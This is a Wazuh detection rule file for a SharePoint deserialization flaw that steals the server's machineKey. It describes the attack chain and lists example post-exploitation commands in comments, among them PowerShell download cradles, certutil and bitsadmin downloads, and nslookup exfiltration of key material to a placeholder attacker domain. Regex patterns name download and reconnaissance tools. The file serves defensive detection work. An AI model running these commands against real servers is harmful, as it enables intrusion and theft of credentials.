<!-- ============================================================
     Microsoft SharePoint Server Deserialization RCE - Machine Key Theft
     CVE-2026-50522 (CWE-502: Deserialization of Untrusted Data)
     Affected: SharePoint Enterprise Server 2016, SharePoint Server 2019,
               SharePoint Server Subscription Edition
     MITRE ATT&amp;CK:
       T1190     - Exploit Public-Facing Application (TA0001 Initial Access)
       T1059.001 - Command and Scripting Interpreter: PowerShell (TA0002 Execution)
       T1059.003 - Command and Scripting Interpreter: Windows Command Shell
       T1105     - Ingress Tool Transfer (TA0011 C2)
       T1505.003 - Server Software Component: Web Shell (TA0003 Persistence)
       T1539     - Steal Web Session Cookie (TA0006 Credential Access)
       T1552.001 - Credentials In Files (TA0006 Credential Access)
     CISA KEV: Not yet added as of 2026-07-22; active exploitation confirmed
     Rule IDs: 104145-104151
     Author: SecOps Engineer (Purple Team)
     Date: 2026-07-22
     Related: CVE-2026-58644 (rules 103979-103985, same attack surface)

     Vulnerability Summary:

     CVE-2026-50522 is a critical-severity (CVSS 9.8) deserialization of
     untrusted data vulnerability in Microsoft SharePoint Server, disclosed
     July 14 2026 (Patch Tuesday). Active exploitation in the wild was
     confirmed by watchTowr on July 22 2026, following public PoC release.

     The vulnerability shares the same .NET deserialization attack surface as
     CVE-2026-58644 but introduces a uniquely dangerous capability: a single
     unauthenticated HTTP POST to /_layouts/15/Authenticate.aspx extracts the
     SharePoint server's ASP.NET machineKey (validationKey + decryptionKey)
     from the running application context. Possession of the machineKey allows
     an attacker to forge arbitrary ViewState payloads that the .NET runtime
     accepts and deserializes with full CLR trust, enabling remote code
     execution on any subsequent request with NO further exploitation required.

     Critically, the machineKey persists after patching when the patch does not
     rotate the key. An attacker who steals the machineKey before patching retains
     persistent RCE capability against the patched server indefinitely, making
     early detection of the theft event essential.

     Attack Chain:

       1. Reconnaissance: Attacker confirms SharePoint version and build via
          /_api/contextinfo, /_vti_bin/sitedata.asmx, or HTTP response headers.
          Version-specific deserialization gadget chains are selected.
       2. Machine Key Theft (single request): Attacker sends an unauthenticated
          HTTP POST to /_layouts/15/Authenticate.aspx containing a serialized
          .NET payload crafted to extract the ASP.NET machineKey configuration
          from SharePoint's HttpContext or System.Web.Security internals. The
          server processes the deserialization, executes attacker-controlled
          code within the application context, and the gadget chain reads and
          exfiltrates the machineKey via OOB DNS/HTTP callback or encodes it
          into the HTTP response. A successful theft produces a single HTTP
          200 response where the body contains the base64-encoded machineKey
          values or triggers an observable OOB callback.
       3. RCE via Forged ViewState: Armed with the machineKey, the attacker
          crafts a malicious __VIEWSTATE parameter signed and encrypted with
          the stolen key. When submitted to any SharePoint page that processes
          ViewState, the .NET runtime deserializes the payload and executes
          the embedded gadget chain. This path does NOT require exploiting
          CVE-2026-50522 a second time; the machineKey alone is sufficient.
       4. Post-Exploitation: Common second-stage actions observed:
          - PowerShell download cradle (w3wp.exe spawning powershell.exe -enc)
          - Cobalt Strike BEACON or similar implant staging
          - Webshell drop to /_layouts/, /_vti_bin/, or inetpub directories
          - Host enumeration (whoami, ipconfig, nltest) for lateral movement
          - LOLBin download (certutil, bitsadmin) for second-stage payload retrieval

     Relationship to CVE-2026-58644:

     Both CVEs exploit .NET deserialization in on-premises SharePoint but differ
     in attack path and persistence mechanism:

       CVE-2026-58644: Generic pre-auth deserialization via /_vti_bin/ or
         /_layouts/ endpoints. RCE requires each exploit attempt to succeed.
         Detection window: each exploit attempt.
       CVE-2026-50522: Targets /_layouts/15/Authenticate.aspx specifically.
         Single-request machineKey theft grants PERSISTENT RCE capability.
         Detection window: the initial theft request (one-time; post-patch
         attacks using stolen key are NOT covered by CVE-2026-50522 detection
         alone; they require ViewState deserialization detections).

     Detection Layers:

     Layer 1 - Process Execution (Sysmon EventID 1, Wazuh SID 61603):
       Rule 104145 (level 0): Silent base anchor - w3wp.exe spawning any child
         process in the context of CVE-2026-50522. Silent; all Layer 1 child
         rules depend on this anchor via if_sid.
       Rule 104146 (level 14): w3wp.exe spawning PowerShell, pwsh, or .NET
         compiler (csc.exe, vbc.exe). First-stage post-RCE actions from
         machineKey-forged ViewState deserialization. Near-certain true positive.
       Rule 104147 (level 13): w3wp.exe spawning download/staging LOLBins
         (certutil, bitsadmin, mshta, wscript, cscript, curl, wget). Second-stage
         payload retrieval following initial RCE via machineKey ViewState forgery.
       Rule 104148 (level 12): w3wp.exe spawning OOB callback or recon utilities
         (nslookup, ping, whoami, ipconfig, nltest, net). Covers both machine
         key exfiltration via DNS OOB callback and post-exploit host enumeration.

     Layer 2 - File Creation (Sysmon EventID 11):
       Rule 104149 (level 15): w3wp.exe creating an ASPX, ASMX, ASHX, or SVC
         file. Persistent webshell deployment following machineKey-enabled RCE.
         Near-zero false positive rate. Requires immediate incident response.

     Layer 3 - HTTP / Traefik reverse proxy (JSON access logs):
       Rule 104150 (level 9): POST to /_layouts/15/Authenticate.aspx -
         primary CVE-2026-50522 exploitation endpoint. Acts as HTTP-layer anchor.
         Alert volume is low to moderate; Authenticate.aspx sees limited POST
         traffic in normal SharePoint operation compared to REST/SOAP endpoints.
       Rule 104151 (level 11): Child of 104150 - POST to Authenticate.aspx
         returning HTTP 5xx. A deserialization exception before gadget chain
         completion surfaces as 500. Repeated 500s from the same source IP
         indicate active exploit probing or gadget chain refinement.

     Log Source Prerequisites:
       Process/File layer (rules 104145-104149): Sysmon installed on Windows
         hosts running IIS/SharePoint with EventID 1 (Process Creation) and
         EventID 11 (File Created) enabled. Wazuh Sysmon integration assigns
         SID 61603 for Sysmon EventID 1. File-creation rule (104149) uses
         decoded_as=json with win.eventdata.eventID field matching.
       HTTP layer (rules 104150-104151): Traefik access logs in JSON format
         forwarded to Wazuh. Field names follow Traefik v2+ JSON log defaults:
         RequestMethod, RequestPath, RequestHost, DownstreamStatus, ClientHost.

     Severity Tiers:
        0 - Process anchor (silent, correlation parent only)
       14 - w3wp.exe spawning PowerShell or .NET compiler (near-certain RCE)
       13 - w3wp.exe spawning download/staging LOLBins (payload staging)
       12 - w3wp.exe spawning OOB/recon tools (DNS OOB callback or enumeration)
       15 - w3wp.exe creating web script file (webshell drop, critical)
        9 - HTTP POST to Authenticate.aspx (anchor, low-volume alert)
       11 - HTTP POST to Authenticate.aspx returning 5xx (exploit probe)

     False Positive Guidance:
       104145: Generic w3wp.exe child process anchor. Benign IIS maintenance
         tasks may spawn child processes during app pool recycling. The specific
         child process types targeted by 104146-104148 have no legitimate
         operational explanation in a SharePoint AppPool context.
       104146: PowerShell or .NET compiler from w3wp.exe has no legitimate
         operational justification in standard SharePoint deployments. Any match
         should be treated as confirmed RCE and escalated immediately.
       104147: Download LOLBins from w3wp.exe are unexpected in production.
         Staging or CI environments running automated deployment tools may
         trigger; baseline source host and user context.
       104148: nslookup/ping from w3wp.exe may occur in custom SharePoint apps
         performing DNS health checks for internal services. Correlate destination
         domain: known-internal destinations are likely benign; external or
         randomly-named domains indicate OOB DNS machineKey exfiltration callbacks.
       104149: Near-zero false positive rate. w3wp.exe writing web script files
         is not a routine SharePoint operation. Any match requires immediate IR.
       104150: Authenticate.aspx receives legitimate POST traffic for forms-based
         authentication (FBA) in on-premises SharePoint deployments using
         FBA providers. Volume is lower than /_vti_bin/ endpoints. Alert on
         unusual source IPs, off-hours traffic, or high-frequency posting from
         a single source.
       104151: HTTP 500 from Authenticate.aspx may occur for malformed FBA
         credentials or misconfigured membership providers. Meaningful signal
         when: (a) same source IP generates multiple 500s across a short window,
         (b) no prior authenticated session exists for that IP, or (c) correlated
         with host-side w3wp.exe child process events (104146-104148).
     ============================================================ -->

<group name="initial_access,exploit_pubfacing,sharepoint,cve_2026_50522,machinekey_theft,">

  <!-- ===========================================================
       Layer 1: Process Execution (Sysmon EventID 1 - Wazuh SID 61603)
       Rule IDs: 104145-104148

       CVE-2026-50522 achieves code execution within the SharePoint IIS
       application pool (w3wp.exe) via forged ViewState payloads signed with
       the stolen machineKey. All post-exploitation process activity originates
       as w3wp.exe children. The silent anchor (104145) correlates parent-child
       process relationships; severity-bearing child rules (104146-104148) fire
       on specific child process types with no legitimate operational justification
       in a production SharePoint IIS AppPool context.
       =========================================================== -->

  <!-- Base anchor: w3wp.exe spawning any child process (silent, level 0).

       SharePoint runs in IIS worker processes (w3wp.exe). Under normal
       operation the AppPool executes .NET managed code internally without
       spawning external child processes. Any child process spawned by
       w3wp.exe is anomalous and warrants inspection. This silent anchor
       at level 0 generates no alert itself; it is the if_sid parent for
       rules 104146-104148, enabling severity escalation based on the
       specific child process type.

       Distinguished from CVE-2026-58644 anchor (103979) by group membership
       (cve_2026_50522); both anchors fire on the same SID 61603 events,
       ensuring parallel detection coverage regardless of which CVE is being
       exploited. -->
  <rule id="104145" level="0">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\w3wp\.exe$</field>
    <description>SharePoint CVE-2026-50522: w3wp.exe spawned child process $(win.eventdata.image) on $(win.eventdata.computer) (base anchor for machineKey theft RCE detection)</description>
    <group>sharepoint,cve_2026_50522,iis_worker,</group>
  </rule>

  <!-- w3wp.exe spawning PowerShell, pwsh, or .NET compiler.

       PowerShell (powershell.exe, pwsh.exe) and the Roslyn C# compiler
       (csc.exe, vbc.exe) are the primary first-stage post-exploitation
       tools invoked by .NET deserialization gadget chains executing via
       machineKey-forged ViewState. Typical patterns observed in the wild:

         - powershell.exe -enc [base64]   : download cradle for reverse shell
         - powershell.exe -nop -w hidden  : Cobalt Strike stager
         - csc.exe /out:[tmp].dll         : in-memory C# compilation of implant

       Because CVE-2026-50522 enables RCE via machineKey ViewState forgery on
       any page (not just the Authenticate.aspx entry point), post-exploit
       commands may originate from a different SharePoint page request than
       the initial theft. This rule fires on any w3wp.exe PowerShell/compiler
       spawn regardless of which SharePoint endpoint triggered deserialization. -->
  <rule id="104146" level="14">
    <if_sid>104145</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)\\(powershell|pwsh|csc|vbc|jsc)\.exe$</field>
    <description>SharePoint CVE-2026-50522: w3wp.exe spawned $(win.eventdata.image) on $(win.eventdata.computer) as $(win.eventdata.user)  -  near-certain RCE via machineKey ViewState forgery; PowerShell download cradle or .NET in-memory compilation; machineKey may have been stolen in a prior single-request exploit; initiate incident response and rotate machineKey (T1190/T1059.001)</description>
    <mitre>
      <id>T1190</id>
      <id>T1059.001</id>
    </mitre>
    <group>sharepoint,cve_2026_50522,rce,powershell,high_confidence,</group>
  </rule>

  <!-- w3wp.exe spawning download or staging LOLBins.

       After achieving RCE via machineKey-forged ViewState deserialization,
       threat actors retrieve second-stage payloads from attacker-controlled
       infrastructure using native Windows binaries (Living Off The Land Binaries):

         - certutil.exe -urlcache -f [url]    : HTTP download, decodes base64
         - bitsadmin /transfer [url] [dest]   : BITS download, evades some AV
         - mshta.exe http://...               : remote HTA payload execution
         - wscript.exe / cscript.exe          : script execution
         - curl.exe / wget.exe                : direct HTTP download

       These binaries have no legitimate use as direct children of the SharePoint
       IIS worker process in production. A match indicates an attacker is staging
       additional capabilities after initial RCE via machineKey-enabled ViewState. -->
  <rule id="104147" level="13">
    <if_sid>104145</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)\\(certutil|bitsadmin|mshta|wscript|cscript|curl|wget)\.exe$</field>
    <description>SharePoint CVE-2026-50522: w3wp.exe spawned download LOLBin $(win.eventdata.image) on $(win.eventdata.computer) as $(win.eventdata.user)  -  second-stage payload staging after machineKey ViewState RCE; attacker retrieving implant from external infrastructure; rotate machineKey immediately (T1190/T1105)</description>
    <mitre>
      <id>T1190</id>
      <id>T1105</id>
    </mitre>
    <group>sharepoint,cve_2026_50522,rce,lolbin,payload_staging,</group>
  </rule>

  <!-- w3wp.exe spawning OOB callback or host-enumeration utilities.

       This rule covers two overlapping detection patterns for CVE-2026-50522:

       1. Machine key exfiltration via DNS OOB callback:
          The CVE-2026-50522 exploitation gadget chain may use nslookup.exe
          or ping.exe to exfiltrate the extracted machineKey material via
          DNS queries to an attacker-controlled resolver. The machineKey value
          (validationKey, decryptionKey) is encoded into subdomain labels of
          an attacker-owned domain and resolved, leaking the key without
          an explicit outbound HTTP connection. This is the most covert
          exfiltration path and the pattern most directly tied to the
          machine key theft aspect of this CVE.

          Examples:
            nslookup.exe [key-prefix].[attacker-domain]
            ping.exe -n 1 [encoded-key].[attacker-domaingt 2. Post-exploit host enumeration:
          After RCE via machineKey ViewState forgery, attackers conduct rapid
          host enumeration before lateral movement:

            whoami.exe           : current process identity
            hostname.exe         : system hostname
            ipconfig.exe /all    : network configuration and DNS domain
            nltest.exe /domain_trusts : Active Directory trust enumeration
            net.exe / net1.exe   : local users, groups, shares, sessions
            arp.exe -a           : adjacent host discovery

       Correlate nslookup/ping child process command-line arguments with
       threat intel: external or randomly-named domain targets indicate
       OOB machineKey exfiltration rather than legitimate DNS health checks. -->
  <rule id="104148" level="12">
    <if_sid>104145</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)\\(nslookup|ping|hostname|whoami|ipconfig|nltest|net|net1|arp|tracert|systeminfo|tasklist)\.exe$</field>
    <description>SharePoint CVE-2026-50522: w3wp.exe spawned $(win.eventdata.image) on $(win.eventdata.computer) as $(win.eventdata.user)  -  OOB machineKey exfiltration or post-exploit host enumeration; DNS OOB via nslookup/ping may indicate machineKey values being exfiltrated to attacker-controlled resolver; review child process command-line for external domain targets (T1190/T1552.001)</description>
    <mitre>
      <id>T1190</id>
      <id>T1552.001</id>
    </mitre>
    <group>sharepoint,cve_2026_50522,rce,oob_callback,machinekey_exfil,enumeration,</group>
  </rule>


  <!-- ===========================================================
       Layer 2: File Creation (Sysmon EventID 11)
       Rule ID: 104149

       Web script file creation by the IIS worker process following
       machineKey-enabled RCE is the clearest indicator of a persistent
       webshell deployed after machineKey theft. Because the machineKey
       grants durable RCE capability, attackers commonly deploy a webshell
       as a backup persistence mechanism to survive machineKey rotation.
       =========================================================== -->

  <!-- w3wp.exe creating a web script file (webshell drop, critical).

       Sysmon EventID 11 (File Created) captures the image path of the
       process that created the file. Under normal SharePoint operation
       w3wp.exe does not create new ASPX, ASMX, ASHX, or SVC files.

       Common webshell deployment paths observed in SharePoint exploitation:
         - C:\inetpub\wwwroot\wss\VirtualDirectories\...\[name].aspx
         - C:\Program Files\Common Files\Microsoft Shared\web server extensions\
           \LAYOUTS\[name].aspx
         - C:\Program Files\Common Files\Microsoft Shared\web server extensions\
           \isapi\[name].asmx

       Any file creation event matching this rule requires immediate incident
       response: identify the created file, analyze for webshell content,
       remove it, rotate the SharePoint machineKey, audit access logs for
       subsequent webshell use, and initiate full IR scope assessment.

       win.eventdata.eventID is matched as pcre2 field because some Wazuh
       Sysmon decoder variants include it as a string in the decoded JSON. -->
  <rule id="104149" level="15">
    <decoded_as>json</decoded_as>
    <field name="win.eventdata.eventID" type="pcre2">^11$</field>
    <field name="win.eventdata.image" type="pcre2">(?i)\\w3wp\.exe$</field>
    <field name="win.eventdata.targetFilename" type="pcre2">(?i)\.(aspx|asmx|ashx|svc|cshtml|vbhtml)$</field>
    <description>SharePoint CVE-2026-50522 CRITICAL: w3wp.exe created web script file $(win.eventdata.targetFilename) on $(win.eventdata.computer)  -  WEBSHELL DROP after machineKey theft RCE; attacker deploying persistent backdoor; initiate immediate incident response, isolate host, rotate machineKey, preserve forensic image (T1505.003/T1190)</description>
    <options>alert_by_email</options>
    <mitre>
      <id>T1505.003</id>
      <id>T1190</id>
    </mitre>
    <group>sharepoint,cve_2026_50522,webshell,persistence,critical,high_confidence,</group>
  </rule>


  <!-- ===========================================================
       Layer 3: HTTP / Traefik reverse proxy (JSON access logs)
       Rule IDs: 104150-104151

       CVE-2026-50522 is triggered by an HTTP POST to
       /_layouts/15/Authenticate.aspx, a SharePoint forms-based
       authentication (FBA) endpoint accessible without authentication.
       Unlike CVE-2026-58644 which targets multiple endpoint patterns,
       CVE-2026-50522 exploitation is concentrated on this specific path.

       This path specificity improves signal-to-noise versus the broader
       /_vti_bin/ and /_layouts/ patterns used by CVE-2026-58644, but
       also means that attackers who use alternative entry paths to
       exercise the stolen machineKey will not trigger these HTTP rules.
       Pair HTTP-layer detections with process-layer rules (104145-104148)
       for complete coverage across both the theft event and subsequent
       machineKey-powered RCE.
       =========================================================== -->

  <!-- POST to Authenticate.aspx: primary CVE-2026-50522 exploit endpoint.

       Fires on any HTTP POST to /_layouts/15/Authenticate.aspx or the
       site-collection-scoped equivalent (/sites/[name]/_layouts/15/...).
       This endpoint is the confirmed delivery vector for the single-request
       machineKey theft. Alert volume is lower than the broader SharePoint
       endpoint patterns in CVE-2026-58644 rules (103984) because
       Authenticate.aspx receives limited POST traffic in environments not
       using SharePoint Forms-Based Authentication providers.

       In FBA-enabled environments, legitimate POST traffic to this path
       occurs for user login submissions. Correlate source IP, request
       frequency, and response body size to distinguish FBA login attempts
       from exploitation: exploitation payloads are typically larger than
       standard credential submissions and may return unexpected response
       bodies encoding machineKey material. -->
  <rule id="104150" level="9">
    <decoded_as>json</decoded_as>
    <field name="RequestMethod">POST</field>
    <field name="RequestPath" type="pcre2">(?i)(?:/_layouts/15/Authenticate\.aspx|/sites/[^/]+/_layouts/15/Authenticate\.aspx)</field>
    <description>SharePoint CVE-2026-50522: HTTP POST to Authenticate.aspx from $(ClientHost) at $(RequestHost)$(RequestPath)  -  primary machineKey theft delivery endpoint; unauthenticated deserialization payload may extract validationKey and decryptionKey in single request; correlate with host-side w3wp.exe process events on SharePoint server (T1190/T1552.001)</description>
    <mitre>
      <id>T1190</id>
      <id>T1552.001</id>
    </mitre>
    <group>sharepoint,cve_2026_50522,initial_access,exploit_pubfacing,http_probe,machinekey_theft,</group>
  </rule>

  <!-- POST to Authenticate.aspx returning HTTP 5xx.

       A .NET deserialization exception before the gadget chain completes
       produces an HTTP 500 Internal Server Error from the SharePoint
       application pool. Attackers probing CVE-2026-50522 with iterative
       payload variants (different gadget chains, encoding variations,
       ysoserial.net chain selection) generate a sequence of 500 responses
       as they refine the exploit. A single 500 may be a transient SharePoint
       FBA provider error; repeated 500s from the same source IP against
       Authenticate.aspx is a strong exploit-probing signal.

       Broader HTTP 5xx range (500-599) is matched: some deserialization
       exceptions surface as 502 if Traefik receives no upstream response,
       or 503 if the SharePoint AppPool crashes and IIS returns service
       unavailable. A 500 from Authenticate.aspx is the canonical
       exploit-probe response for CVE-2026-50522. -->
  <rule id="104151" level="11">
    <if_sid>104150</if_sid>
    <field name="DownstreamStatus" type="pcre2">^5\d{2}$</field>
    <description>SharePoint CVE-2026-50522: POST to Authenticate.aspx at $(RequestHost)$(RequestPath) from $(ClientHost) returned HTTP $(DownstreamStatus)  -  deserialization exception likely; active machineKey theft probe or gadget chain refinement in progress; check for repeated 5xx from same source IP; correlate with host-side w3wp.exe events (T1190)</description>
    <mitre>
      <id>T1190</id>
    </mitre>
    <group>sharepoint,cve_2026_50522,initial_access,exploit_pubfacing,deserialization_probe,</group>
  </rule>

</group>
